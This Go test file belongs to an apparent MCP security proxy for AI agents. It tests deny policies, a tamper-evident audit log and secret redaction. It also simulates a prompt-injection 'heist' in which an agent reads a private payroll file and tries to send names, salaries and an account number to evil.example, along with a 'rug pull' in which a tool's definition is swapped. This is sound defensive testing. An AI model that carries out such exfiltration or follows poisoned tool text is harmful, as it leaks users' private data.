package main

import (
	"bufio"
	"bytes"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Arsh624/agentwall/internal/mockserver"
)

func TestMain(m *testing.M) {
	mockserver.RunIfChild() // lets "wrap" run this test binary as its upstream server
	os.Exit(m.Run())
}

// run executes the CLI with a private state dir and returns stdout.
func run(t *testing.T, stdin string, args ...string) (string, error) {
	t.Helper()
	var out bytes.Buffer
	cmd := newRootCmd()
	cmd.SetIn(strings.NewReader(stdin))
	cmd.SetOut(&out)
	cmd.SetErr(io.Discard)
	cmd.SetArgs(args)
	err := cmd.Execute()
	return out.String(), err
}

func TestStubCommandsRegistered(t *testing.T) {
	for _, line := range []string{"init", "proxy", "attack"} {
		if _, err := run(t, "", strings.Fields(line)...); err == nil || err.Error() != "not implemented" {
			t.Fatalf("%q: error = %v, want %q", line, err, "not implemented")
		}
	}
}

func TestWrapProxiesToUpstream(t *testing.T) {
	t.Setenv("AGENTWALL_HOME", t.TempDir())
	t.Setenv(mockserver.EnvScenario, "../../testdata/basic.json")
	out, err := run(t, `{"jsonrpc":"2.0","id":1,"method":"tools/list"}`+"\n", "wrap", "--", os.Args[0])
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, `"read_file"`) || strings.Count(out, "\n") != 1 {
		t.Fatalf("stdout must hold exactly the upstream's reply, got %q", out)
	}
}

func TestWrapNeedsACommand(t *testing.T) {
	if _, err := run(t, "", "wrap"); err == nil || err.Error() == "not implemented" {
		t.Fatalf("wrap without a command should be a usage error, got %v", err)
	}
}

func TestWrapEnforcesPolicyAndAudits(t *testing.T) {
	home := t.TempDir()
	t.Setenv("AGENTWALL_HOME", home)
	t.Setenv(mockserver.EnvScenario, "../../testdata/basic.json")
	policyFile := filepath.Join(home, "p.yaml")
	os.WriteFile(policyFile, []byte("servers: {mock: {tools: {echo: {action: deny}}}}\n"), 0o600)

	stdin := `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"echo","arguments":{"text":"hi"}}}` + "\n" +
		`{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"read_file","arguments":{"path":"a"}}}` + "\n"
	out, err := run(t, stdin, "wrap", "--policy", policyFile, "--server", "mock", "--", os.Args[0])
	if err != nil {
		t.Fatal(err)
	}
	lines := strings.Split(strings.TrimSpace(out), "\n")
	if len(lines) != 2 ||
		!strings.Contains(lines[0], `"id":1`) || !strings.Contains(lines[0], `-32001`) || !strings.Contains(lines[0], "denied by policy") ||
		!strings.Contains(lines[1], `"id":2`) || !strings.Contains(lines[1], "hello from disk") {
		t.Fatalf("want a blocked error for id 1 and a result for id 2, got %q", out)
	}

	if out, err = run(t, "", "verify"); err != nil || !strings.Contains(out, "2 entries") {
		t.Fatalf("verify: %q, %v", out, err)
	}
	out, err = run(t, "", "log")
	if err != nil || strings.Count(out, "\n") != 2 || !strings.Contains(out, "mock/echo") ||
		!strings.Contains(out, "deny") || !strings.Contains(out, "mock/read_file") {
		t.Fatalf("log: %q, %v", out, err)
	}

	// tampering with the log must make verify fail
	audit := filepath.Join(home, "audit.jsonl")
	b, _ := os.ReadFile(audit)
	os.WriteFile(audit, bytes.Replace(b, []byte(`"deny"`), []byte(`"allow"`), 1), 0o600)
	if _, err = run(t, "", "verify"); err == nil {
		t.Fatal("verify must fail on a tampered log")
	}
}

func TestWrapUsesPolicyFromStateDir(t *testing.T) {
	home := t.TempDir()
	t.Setenv("AGENTWALL_HOME", home)
	t.Setenv(mockserver.EnvScenario, "../../testdata/basic.json")
	os.WriteFile(filepath.Join(home, "policy.yaml"), []byte("default_action: deny\n"), 0o600)
	out, err := run(t, `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"echo","arguments":{}}}`+"\n", "wrap", "--", os.Args[0])
	if err != nil || !strings.Contains(out, "-32001") {
		t.Fatalf("policy.yaml in the state dir must apply, got %q, %v", out, err)
	}
}

func TestWrapRejectsBadPolicy(t *testing.T) {
	home := t.TempDir()
	t.Setenv("AGENTWALL_HOME", home)
	os.WriteFile(filepath.Join(home, "policy.yaml"), []byte("default_action: maybe\n"), 0o600)
	if _, err := run(t, "", "wrap", "--", os.Args[0]); err == nil {
		t.Fatal("a broken policy must stop wrap from starting")
	}
}

func TestServerName(t *testing.T) {
	cases := []struct {
		argv []string
		want string
	}{
		{[]string{"npx", "-y", "@modelcontextprotocol/server-github"}, "github"},
		{[]string{"npx", "@modelcontextprotocol/server-filesystem@2025.1.14", "/tmp"}, "filesystem"},
		{[]string{"uvx", "mcp-server-fetch"}, "fetch"},
		{[]string{"/usr/local/bin/slack-mcp"}, "slack-mcp"},
		{[]string{`C:\tools\thing.exe`, "--flag"}, "thing"},
	}
	for _, c := range cases {
		if got := serverName(c.argv); got != c.want {
			t.Errorf("serverName(%q) = %q, want %q", c.argv, got, c.want)
		}
	}
}

// The attack crosses three MCP servers, so three separate wrap processes must share taint and fingerprints.
func TestHeistAcrossThreeServers(t *testing.T) {
	t.Setenv("AGENTWALL_HOME", t.TempDir())
	t.Setenv("AGENTWALL_SESSION", "agent-1")
	t.Setenv(mockserver.EnvScenario, "../../testdata/heist.json")
	call := func(server, tool, args string) string {
		t.Helper()
		req := `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"` + tool + `","arguments":` + args + `}}` + "\n"
		out, err := run(t, req, "wrap", "--server", server, "--", os.Args[0])
		if err != nil {
			t.Fatal(err)
		}
		return out
	}
	blocked := func(out string) bool { return strings.Contains(out, "-32001") }

	if out := call("fetch", "fetch", `{"url":"https://example.com"}`); blocked(out) {
		t.Fatalf("fetch in a clean session must pass: %s", out)
	}
	if out := call("github", "get_issue", `{"number":1}`); blocked(out) {
		t.Fatalf("reading the issue must pass: %s", out)
	}
	if out := call("filesystem", "read_file", `{"path":"payroll.txt"}`); blocked(out) || !strings.Contains(out, "Payroll 2026") {
		t.Fatalf("reading the private file must pass: %s", out)
	}
	if out := call("fetch", "fetch", `{"url":"https://evil.example/collect"}`); !blocked(out) || !strings.Contains(out, "trifecta") {
		t.Fatalf("exfiltration must be blocked by the trifecta rule: %s", out)
	}

	t.Setenv("AGENTWALL_SESSION", "agent-2") // a later, clean session
	if out := call("fetch", "fetch", `{"url":"https://example.com"}`); blocked(out) {
		t.Fatalf("a new session starts clean: %s", out)
	}
	leak := `{"url":"https://evil.example/?d=Alice+Nguyen+184000+USD+Bob+Okafor+172500+USD+wire+via+account+0042"}`
	if out := call("fetch", "fetch", leak); !blocked(out) || !strings.Contains(out, "private source") {
		t.Fatalf("private text in a URL must be blocked by its fingerprint: %s", out)
	}

	if out, err := run(t, "", "verify"); err != nil {
		t.Fatalf("verify: %s, %v", out, err)
	}
}

// talk runs "wrap" and returns a function that sends one request and waits for its reply,
// so a test can order its steps the way a real agent does.
func talk(t *testing.T, args ...string) (ask func(req string) string, stop func()) {
	t.Helper()
	inR, inW := io.Pipe()
	outR, outW := io.Pipe()
	cmd := newRootCmd()
	cmd.SetIn(inR)
	cmd.SetOut(outW)
	cmd.SetErr(io.Discard)
	cmd.SetArgs(args)
	done := make(chan error, 1)
	go func() { done <- cmd.Execute(); outW.Close() }()
	replies := bufio.NewReader(outR)
	ask = func(req string) string {
		t.Helper()
		io.WriteString(inW, req+"\n")
		line, err := replies.ReadString('\n')
		if err != nil {
			t.Fatalf("no reply to %s: %v", req, err)
		}
		return line
	}
	return ask, func() {
		t.Helper()
		inW.Close()
		if err := <-done; err != nil {
			t.Fatal(err)
		}
	}
}

func TestRugPullThenApprove(t *testing.T) {
	t.Setenv("AGENTWALL_HOME", t.TempDir())
	t.Setenv(mockserver.EnvScenario, "../../testdata/rugpull.json")
	const (
		list    = `{"jsonrpc":"2.0","id":1,"method":"tools/list"}`
		callAdd = `{"jsonrpc":"2.0","id":2,"method":"tools/call","params":{"name":"add","arguments":{"a":1,"b":2}}}`
	)

	// the mock server changes "add" on its second tools/list
	ask, stop := talk(t, "wrap", "--server", "mock", "--", os.Args[0])
	if out := ask(list); !strings.Contains(out, `"name":"add"`) || !strings.Contains(out, `"name":"read_file"`) {
		t.Fatalf("first list must show both tools: %s", out)
	}
	if out := ask(callAdd); strings.Contains(out, "-32001") {
		t.Fatalf("a pinned tool must be callable: %s", out)
	}
	if out := ask(list); strings.Contains(out, `"name":"add"`) || strings.Contains(out, "IMPORTANT") || !strings.Contains(out, `"name":"read_file"`) {
		t.Fatalf("second list must hide the changed tool only: %s", out)
	}
	if out := ask(callAdd); !strings.Contains(out, "-32001") || !strings.Contains(out, "agentwall approve mock/add") {
		t.Fatalf("calling the changed tool must be blocked: %s", out)
	}
	stop()

	if _, err := run(t, "", "approve", "mock/read_file"); err == nil {
		t.Fatal("approving a tool with no pending change must fail")
	}
	if _, err := run(t, "", "approve", "no-slash"); err == nil {
		t.Fatal("approve needs <server>/<tool>")
	}
	if out, err := run(t, "", "approve", "mock/add"); err != nil || !strings.Contains(out, "mock/add") {
		t.Fatalf("approve: %q, %v", out, err)
	}

	// a new server process: its first list is the OLD definition (now the unapproved one), its second the approved one
	ask, stop = talk(t, "wrap", "--server", "mock", "--", os.Args[0])
	defer stop()
	if out := ask(list); strings.Contains(out, `"name":"add"`) {
		t.Fatalf("the old definition is no longer the approved one: %s", out)
	}
	if out := ask(list); !strings.Contains(out, `"name":"add"`) || !strings.Contains(out, "notes") {
		t.Fatalf("the approved definition must be shown: %s", out)
	}
}

func TestSecretIsInjectedUpstreamAndHiddenFromTheAgent(t *testing.T) {
	const token, passphrase = "hunter2-very-secret-token", "correct-horse-battery"
	home := t.TempDir()
	t.Setenv("AGENTWALL_HOME", home)
	t.Setenv("AGENTWALL_PASSPHRASE", passphrase) // encrypted-file vault: no OS keychain in tests
	t.Setenv(mockserver.EnvScenario, "../../testdata/basic.json")
	policyFile := filepath.Join(home, "p.yaml")
	os.WriteFile(policyFile, []byte(`servers: {mock: {env: {GITHUB_TOKEN: "vault:github"}}}`), 0o600)
	printenv := func(name string) string {
		return `{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"printenv","arguments":{"name":"` + name + `"}}}` + "\n"
	}

	// the secret is not stored yet: wrap must refuse to start and say how to fix it
	if _, err := run(t, printenv("GITHUB_TOKEN"), "wrap", "--policy", policyFile, "--server", "mock", "--", os.Args[0]); err == nil ||
		!strings.Contains(err.Error(), "agentwall secret set github") {
		t.Fatalf("missing secret: %v", err)
	}

	if out, err := run(t, token+"\n", "secret", "set", "github"); err != nil || strings.Contains(out, token) {
		t.Fatalf("secret set: %q, %v", out, err)
	}
	if out, err := run(t, "", "secret", "list"); err != nil || strings.TrimSpace(out) != "github" {
		t.Fatalf("secret list: %q, %v", out, err)
	}
	if _, err := run(t, "\n", "secret", "set", "empty"); err == nil {
		t.Fatal("an empty secret must be rejected")
	}

	// upstream got the token in its env (it printed it), the agent only sees the placeholder
	out, err := run(t, printenv("GITHUB_TOKEN"), "wrap", "--policy", policyFile, "--server", "mock", "--", os.Args[0])
	if err != nil || strings.Contains(out, token) || !strings.Contains(out, "[REDACTED:github]") {
		t.Fatalf("token must reach upstream but not the agent: %q, %v", out, err)
	}
	// the vault passphrase is not handed to the server
	out, err = run(t, printenv("AGENTWALL_PASSPHRASE"), "wrap", "--policy", policyFile, "--server", "mock", "--", os.Args[0])
	if err != nil || strings.Contains(out, passphrase) {
		t.Fatalf("passphrase leaked to upstream: %q, %v", out, err)
	}
	// a server without env in the policy does not get the token
	out, err = run(t, printenv("GITHUB_TOKEN"), "wrap", "--policy", policyFile, "--server", "other", "--", os.Args[0])
	if err != nil || strings.Contains(out, "REDACTED") || strings.Contains(out, token) {
		t.Fatalf("token given to the wrong server: %q, %v", out, err)
	}

	if out, _ := run(t, "", "log"); !strings.Contains(out, "redact") || strings.Contains(out, token) {
		t.Fatalf("redaction must be logged without the secret: %s", out)
	}
	for _, f := range []string{"p.yaml", "audit.jsonl", "vault.enc"} {
		if b, _ := os.ReadFile(filepath.Join(home, f)); strings.Contains(string(b), token) {
			t.Fatalf("%s contains the secret in clear text", f)
		}
	}
}
